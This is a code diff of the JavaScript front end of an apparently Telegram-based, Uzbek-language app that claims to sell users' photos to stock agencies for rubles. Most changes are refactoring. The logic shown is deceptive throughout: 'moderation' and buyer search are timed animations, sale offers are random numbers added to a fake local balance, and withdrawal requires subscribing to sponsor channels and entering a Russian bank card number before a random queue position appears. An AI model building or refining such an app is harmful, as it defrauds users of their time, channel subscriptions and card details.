-                    </a>
+                    <a href="${chan.link}" target="_blank" class="bg-brand-blue hover:bg-blue-600 shrink-0 text-white font-bold text-[10px] py-2 px-3.5 rounded-xl transition">A'zo bo'lish</a>
                 `;
-                container.appendChild(channelCard);
+                container.appendChild(card);
             });
         }
 
         function verifyAllSubscriptions() {
-            if (appState.dynamicChannels.length === 0) {
-                processWithdrawalQueue();
-                return;
-            }
+            if (appState.dynamicChannels.length === 0) { processWithdrawalQueue(); return; }
 
-            const verifyBtn = document.querySelector('button[onclick="verifyAllSubscriptions()"]');
-            const originalText = verifyBtn.innerHTML;
-            verifyBtn.innerHTML = `<i class="fa-solid fa-circle-notch animate-spin mr-1"></i> Tekshirilmoqda...`;
-            verifyBtn.disabled = true;
+            const btn = document.querySelector('button[onclick="verifyAllSubscriptions()"]');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = `<i class="fa-solid fa-circle-notch animate-spin mr-1"></i> Tekshirilmoqda...`;
+            btn.disabled = true;
 
             fetch(`${BACKEND_URL}?action=check_subscriptions&user_id=${tgUserId}`)
                 .then(res => res.json())
                 .then(data => {
-                    verifyBtn.innerHTML = originalText;
-                    verifyBtn.disabled = false;
-
-                    if (data && data.success) {
-                        processWithdrawalQueue();
-                    } else {
-                        showModal("Ogohlantirish", "Siz barcha kanallarga a'zo bo'lmagansiz! Iltimos, ro'yxatdagi barcha kanallarga obuna bo'ling va yana urinib ko'ring.", "error");
-                    }
+                    btn.innerHTML = originalText; btn.disabled = false;
+                    if (data && data.success) processWithdrawalQueue();
+                    else showModal("Ogohlantirish", "Ro'yxatdagi barcha kanallarga to'liq obuna bo'ling (yoki zayavka yuboring) va qayta tekshiring.", "error");
                 })
                 .catch(() => {
-                    verifyBtn.innerHTML = originalText;
-                    verifyBtn.disabled = false;
-                    showModal("Xatolik", "Server bilan ulanishda xatolik yuz berdi. Internetni tekshiring.", "error");
+                    btn.innerHTML = originalText; btn.disabled = false;
+                    showModal("Xatolik", "Serverga ulanib bo'lmadi.", "error");
                 });
         }
 
         function processWithdrawalQueue() {
-            const startQueue = Math.floor(Math.random() * 20) + 60;
+            const startQueue = Math.floor(Math.random() * 20) + 60; // 60 dan 80 gacha
             appState.queuePosition = startQueue;
             appState.withdrawAmount = appState.balance;
             appState.balance = 0;
             appState.withdrawPending = true;
 
-            localStorage.setItem(`cikagophoto_withdraw_date_${tgUserId}`, Date.now().toString());
+            localStorage.setItem(`photostock_withdraw_date_${tgUserId}`, Date.now().toString());
             saveLocalState();
 
-            showModal("So'rov yuborildi!", `Sizning pul yechish so'rovingiz tasdiqlandi. Navbatingiz: ${startQueue}-o'rinda. Pulingiz har 2 soatda navbat siljigach tushadi.`, "success");
+            showModal("So'rov yuborildi!", `Sizning pul yechish so'rovingiz tasdiqlandi. Navbatingiz: ${startQueue}-o'rinda.`, "success");
             setTimeout(() => { closeModal(); changeScreen('screen-profile'); }, 5000);
         }
 
         function showModal(title, text, type = 'success') {
             const modal = document.getElementById('custom-modal');
-            const iconContainer = document.getElementById('modal-icon-container');
+            const icon = document.getElementById('modal-icon-container');
             document.getElementById('modal-title').innerText = title;
             document.getElementById('modal-desc').innerText = text;
 
             if (type === 'success') {
-                iconContainer.className = "w-12 h-12 rounded-2xl bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center justify-center mx-auto text-xl";
-                iconContainer.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
-            } else if (type === 'error') {
-                iconContainer.className = "w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-400 border border-rose-500/20 flex items-center justify-center mx-auto text-xl";
-                iconContainer.innerHTML = '<i class="fa-solid fa-circle-xmark"></i>';
+                icon.className = "w-12 h-12 rounded-2xl bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center justify-center mx-auto text-xl";
+                icon.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
+            } else {
+                icon.className = "w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-400 border border-rose-500/20 flex items-center justify-center mx-auto text-xl";
+                icon.innerHTML = '<i class="fa-solid fa-circle-xmark"></i>';
             }
             modal.classList.remove('hidden');
         }
@@ -579,38 +509,28 @@
         function closeModal() { document.getElementById('custom-modal').classList.add('hidden'); }
 
         function changeScreen(screenId) {
-            const screens = ['screen-profile', 'screen-upload', 'screen-moderation', 'screen-search', 'screen-offer', 'screen-sold', 'screen-withdraw-options', 'screen-payment-details', 'screen-sponsors'];
-            screens.forEach(id => document.getElementById(id).classList.add('hidden'));
+            ['screen-profile', 'screen-upload', 'screen-moderation', 'screen-search', 'screen-offer', 'screen-sold', 'screen-withdraw-options', 'screen-payment-details', 'screen-sponsors'].forEach(id => document.getElementById(id).classList.add('hidden'));
             document.getElementById(screenId).classList.remove('hidden');
 
-            if (appState.history[appState.history.length - 1] !== screenId) {
-                appState.history.push(screenId);
-            }
+            if (appState.history[appState.history.length - 1] !== screenId) appState.history.push(screenId);
             backBtn.classList.toggle('hidden', appState.history.length <= 1);
-            updateFooterNavStyles(screenId);
+            
+            const btns = [document.getElementById('nav-btn-home'), document.getElementById('nav-btn-upload'), document.getElementById('nav-btn-withdraw')];
+            btns.forEach(b => { b.classList.remove('text-brand-lightBlue'); b.classList.add('text-slate-400'); });
+            
+            if (screenId === 'screen-profile') btns[0].classList.add('text-brand-lightBlue');
+            else if (screenId === 'screen-upload') btns[1].classList.add('text-brand-lightBlue');
+            else if (['screen-withdraw-options', 'screen-payment-details', 'screen-sponsors'].includes(screenId)) btns[2].classList.add('text-brand-lightBlue');
         }
 
         backBtn.addEventListener('click', () => {
             if (appState.history.length > 1) {
                 appState.history.pop();
                 const prevScreen = appState.history[appState.history.length - 1];
-                if (prevScreen === 'screen-moderation' || prevScreen === 'screen-search') changeScreen('screen-profile');
+                if (['screen-moderation', 'screen-search'].includes(prevScreen)) changeScreen('screen-profile');
                 else changeScreen(prevScreen);
             }
         });
-
-        function updateFooterNavStyles(activeScreenId) {
-            const btns = [document.getElementById('nav-btn-home'), document.getElementById('nav-btn-upload'), document.getElementById('nav-btn-withdraw')];
-            btns.forEach(btn => { btn.classList.remove('text-brand-lightBlue'); btn.classList.add('text-slate-400'); });
-
-            if (activeScreenId === 'screen-profile') {
-                btns[0].classList.add('text-brand-lightBlue'); btns[0].classList.remove('text-slate-400');
-            } else if (activeScreenId === 'screen-upload') {
-                btns[1].classList.add('text-brand-lightBlue'); btns[1].classList.remove('text-slate-400');
-            } else if (['screen-withdraw-options', 'screen-payment-details', 'screen-sponsors'].includes(activeScreenId)) {
-                btns[2].classList.add('text-brand-lightBlue'); btns[2].classList.remove('text-slate-400');
-            }
-        }
 
         function triggerFileInput() { document.getElementById('real-file-input').click(); }
 
@@ -618,22 +538,23 @@
             const files = event.target.files;
             if (files.length === 0) return;
             appState.selectedPhotoCount = Math.min(files.length, 10);
-            selectedCountLabel.innerText = `Tanlangan: ${appState.selectedPhotoCount} / 10`;
-            previewGrid.innerHTML = '';
-            previewGrid.classList.remove('hidden');
+            document.getElementById('selected-count-label').innerText = `Tanlangan: ${appState.selectedPhotoCount} / 10`;
+            const grid = document.getElementById('selected-photos-preview');
+            grid.innerHTML = ''; grid.classList.remove('hidden');
 
             for (let i = 0; i < appState.selectedPhotoCount; i++) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
                     const card = document.createElement('div');
-                    card.className = "aspect-square rounded-xl bg-slate-800 border border-slate-700 relative overflow-hidden shadow-md";
+                    card.className = "aspect-square rounded-xl bg-slate-800 border border-slate-700 relative overflow-hidden";
                     card.innerHTML = `<img src="${e.target.result}" class="w-full h-full object-cover"><span class="absolute bottom-1 right-1 bg-slate-950/80 text-[8px] px-1.5 py-0.5 rounded font-mono text-emerald-400">OK</span>`;
-                    previewGrid.appendChild(card);
+                    grid.appendChild(card);
                 }
                 reader.readAsDataURL(files[i]);
             }
-            btnSubmitModeration.removeAttribute('disabled');
-            btnSubmitModeration.className = "w-full bg-brand-blue hover:bg-blue-600 text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/20 transition duration-200 cursor-pointer active:scale-[0.98]";
+            const btn = document.getElementById('btn-submit-moderation');
+            btn.removeAttribute('disabled');
+            btn.className = "w-full bg-brand-blue hover:bg-blue-600 text-white font-bold py-4 px-6 rounded-2xl transition cursor-pointer";
         }
 
         function startModeration() {
@@ -642,21 +563,18 @@
                 document.getElementById('mod-step-1-icon').className = "fa-solid fa-circle-check text-emerald-400";
                 document.getElementById('mod-step-1-text').className = "text-slate-400 line-through";
                 document.getElementById('mod-step-2-icon').className = "fa-solid fa-circle-notch text-brand-lightBlue animate-spin";
-                document.getElementById('mod-step-2-text').className = "text-slate-300";
-                document.getElementById('mod-step-2-text').innerText = "Unikallik tahlili bajarilmoqda...";
+                document.getElementById('mod-step-2-text').innerText = "Unikallik...";
             }, 1500);
             setTimeout(() => {
                 document.getElementById('mod-step-2-icon').className = "fa-solid fa-circle-check text-emerald-400";
                 document.getElementById('mod-step-2-text').className = "text-slate-400 line-through";
-                document.getElementById('mod-step-2-text').innerText = "Sifat va Unikallik tasdiqlandi!";
+                document.getElementById('mod-step-2-text').innerText = "Tasdiqlandi!";
             }, 3200);
             setTimeout(() => { startSearch(); }, 4500);
         }
 
-        function startSearch(isAlternative = false) {
+        function startSearch() {
             changeScreen('screen-search');
-            document.getElementById('search-country-text').innerText = "Yevropa va AQSh fotostok fondlari bilan bog'lanilmoqda...";
-            setTimeout(() => { document.getElementById('search-country-text').innerText = "Mos xaridorlar topildi. Taklif shakllantirilmoqda..."; }, 1500);
             setTimeout(() => {
                 appState.pendingOffer = Math.floor((Math.random() * 30 + 10) * 92.5);
                 document.getElementById('offer-price-display').innerHTML = `${formatRubles(appState.pendingOffer).replace(" RUB", "")}<span class="text-brand-lightBlue text-xl"> RUB</span>`;
@@ -664,52 +582,41 @@
             }, 3200);
         }
 
-        function acceptOffer() { changeScreen('screen-sold'); }
-
         function goToProfileAfterSale() {
             appState.balance += appState.pendingOffer;
             appState.totalEarnings += appState.pendingOffer;
             appState.soldPhotos += appState.selectedPhotoCount;
-            appState.selectedPhotoCount = 0;
-            appState.pendingOffer = 0;
-            selectedCountLabel.innerText = "Tanlangan: 0 / 10";
-            btnSubmitModeration.setAttribute('disabled', 'true');
-            btnSubmitModeration.className = "w-full bg-slate-800 text-slate-500 font-bold py-4 px-6 rounded-2xl cursor-not-allowed transition duration-200";
-            previewGrid.classList.add('hidden');
-            previewGrid.innerHTML = '';
+            appState.selectedPhotoCount = 0; appState.pendingOffer = 0;
+            document.getElementById('selected-count-label').innerText = "Tanlangan: 0 / 10";
             document.getElementById('real-file-input').value = '';
+            document.getElementById('selected-photos-preview').classList.add('hidden');
+            
+            const btn = document.getElementById('btn-submit-moderation');
+            btn.setAttribute('disabled', 'true');
+            btn.className = "w-full bg-slate-800 text-slate-500 font-bold py-4 px-6 rounded-2xl cursor-not-allowed transition";
+            
             saveLocalState();
             changeScreen('screen-profile');
         }
 
         function selectWithdrawMethod(method) {
             appState.currentWithdrawMethod = method;
-            const cardInput = document.getElementById('card-number-input');
-            const labelEl = document.getElementById('input-label-primary');
-            cardInput.value = '';
-
-            if (method === 'BTB') {
-                labelEl.innerText = "BTB BANK KARTA RAQAMI (16 RAQAM)";
-                cardInput.placeholder = "2200 0000 0000 0000";
-            } else if (method === 'Sberbank') {
-                labelEl.innerText = "SBERBANK KARTA RAQAMI (16 RAQAM)";
-                cardInput.placeholder = "4276 0000 0000 0000";
-            } else {
-                labelEl.innerText = "TINKOFF BANK KARTA RAQAMI (16 RAQAM)";
-                cardInput.placeholder = "4377 0000 0000 0000";
-            }
+            const input = document.getElementById('card-number-input');
+            input.value = '';
+            if (method === 'BTB') input.placeholder = "2200 0000 0000 0000";
+            else if (method === 'Sberbank') input.placeholder = "4276 0000 0000 0000";
+            else input.placeholder = "4377 0000 0000 0000";
+            
+            document.getElementById('input-label-primary').innerText = `${method.toUpperCase()} KARTA RAQAMI (16 RAQAM)`;
             changeScreen('screen-payment-details');
         }
 
         function confirmWithdrawal() {
-            const val = document.getElementById('card-number-input').value.replace(/\s/g, '');
-            if (val.length !== 16) {
-                showModal("Xatolik", "Iltimos, Rossiya bankining 16 xonali karta raqamini to'g'ri va to'liq kiriting!", "error");
-                return;
+            if (document.getElementById('card-number-input').value.replace(/\s/g, '').length !== 16) {
+                showModal("Xatolik", "Karta raqamini to'liq kiriting (16 ta raqam).", "error"); return;
             }
             if (appState.balance <= 0) {
-                showModal("Xatolik", "Yechib olish uchun hisobingizda yetarli mablag' mavjud emas!", "error");
-                return;
+                showModal("Xatolik", "Yechib olish uchun hisobda mablag' yo'q!", "error"); return;
             }
             changeScreen('screen-sponsors');
         }
